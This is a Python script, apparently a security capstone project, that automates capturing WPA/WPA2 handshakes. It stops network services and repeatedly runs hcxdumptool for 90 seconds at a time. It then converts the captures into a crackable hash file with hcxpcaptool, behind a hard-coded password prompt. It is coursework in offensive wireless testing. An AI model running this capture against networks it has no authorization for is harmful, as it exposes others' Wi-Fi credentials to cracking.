#!/usr/bin/python3
#Project Overhaul
#Filename: ProjectOverhaul.py
#ITSC-310 System Security Capstone
#Author: Checkmatte
#Python Script that will automate capturing WPA/WPA2 handshakes
#############################################################################################################################################################################################################
import os
import subprocess
import time
import datetime
import socket
import signal
from twilio.rest import Client
#############################################################################################################################################################################################################
Password = "Overhaul"				   # This can be set to whatever the person or company wants its just there to protect a safer way is to put it into a txt file so that this can only run with that file.
FAILED_Attempts = 0  				   # This acts as a fail safe if you want it to be more or less change the if statment to whatever number
current_time = datetime.datetime.now() 		   # This will get the current time and date so when executed it will print the time and date
Interface = 'wlan0'				   # This must be set to what your current wifi adapter is.
#############################################################################################################################################################################################################

#This is the main program that will do pretty much everything
def Startup():
	clear = subprocess.run(["clear"])
	#This is a interface header
	print("  _____           _           _      ____                 _                 _ ")
	print(" |  __ \         (_)         | |    / __ \               | |               | |")
	print(" | |__) | __ ___  _  ___  ___| |_  | |  | |_   _____ _ __| |__   __ _ _   _| |")
	print(" |  ___/ '__/ _ \| |/ _ \/ __| __| | |  | \ \ / / _ \ '__| '_ \ / _` | | | | |")
	print(" | |   | | | (_) | |  __/ (__| |_  | |__| |\ V /  __/ |  | | | | (_| | |_| | |")
	print(" |_|   |_|  \___/| |\___|\___|\__|  \____/  \_/ \___|_|  |_| |_|\__,_|\__,_|_|")
	print("                _/ |                                                          ")
	print("               |__/                                                           ")
	print("****************************************************************")
	print("*                                                              *")
	print("*                     Created by: Checkmatte                  *")
	print("*                                                              *")
	print("*                         Course: ITSC-310                     *")
	print("*                                                              *")
	print(current_time.strftime("*                       %Y-%m-%d||%I:%M:%S                   *"))
	print("*                                                              *")
	print("****************************************************************")
		
	#This will kill the network manager so that you can put it into monitor mode
	RFKILL = subprocess.run(["rfkill","unblock", "wifi"])
	AIRMON_CHECK_KILL = subprocess.run(["airmon-ng","check","kill"])
	

	while True:
		Monitor_Mode = subprocess.Popen(["hcxdumptool", "-i", Interface ,"-o", "results", "-t", "5", "--enable_status=1"])
		
		#Waits for 90 seconds to scan as many possible AP's as the program can find.
		print("Sleeping for 90 seconds to scan area!") 	
		time.sleep(90)
		Monitor_Mode.send_signal(signal.SIGINT)

		Conversion = subprocess.Popen("hcxpcaptool -z HASH.pmk results*",shell=True)
		time.sleep(1)
		
		if os.path.exists('HASH.pmk'):
			break
		else:
			continue
			
	#Simple counter to track the amount of lines in the hash file.
	file = open("HASH.pmk","r")
	Line_Count = 0
	
	File_Check = file.read()
	File_Line = File_Check.split("\n")
	
	#run's the for loop and counts every line and +1 to Line_Count for every line found.
	for i in File_Line:
		if i:
			Line_Count += 1
					
#This is just for if the password was entered incorrectly too many times		
def Failure():
	for i in range(5):
		print("WARNING WARNING TOO MANY FAILED ATTEMPTS EXITING PROGRAM!!!")
		
#Will ask for correct password until answered correctly unless it hits the FAILED_Attempts cap
while True:

	#Checks to see if the program was ran in root/sudo
	if not 'SUDO_UID' in os.environ.keys():
		print("Project Overhaul must be ran in Sudo!")
		exit()

	#Basic Password protection	
	login = input("Please enter the password to continue: ")
	FAILED_Attempts = FAILED_Attempts + 1
	if login == Password:
		Startup()
		break
	if login != Password:
		print("Password was wrong try again: ")
	if FAILED_Attempts == 5:
		Failure()
		break

#Helpful Commands
	#sudo service NetworkManager restart
	#iwconfig
	#rm results*
